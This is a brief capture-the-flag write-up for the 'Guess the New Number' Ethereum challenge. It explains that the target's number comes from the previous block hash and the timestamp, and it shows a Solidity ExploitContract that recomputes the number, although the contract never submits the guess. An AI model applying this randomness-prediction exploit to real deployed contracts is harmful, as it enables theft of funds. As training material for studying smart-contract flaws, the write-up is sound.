# Guess the New Number

Answer is already there. We can see how number has been generated and it is generated on each function call, dependeing on previous bock and current block timestamp, 
so we cak use the same to calculate it.

```
contract ExploitContract {
    GuessNewNumber public guessNewNumber;
    uint8 public answer;

    function Exploit() public returns (uint8) {
        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        return answer;
    }
}
```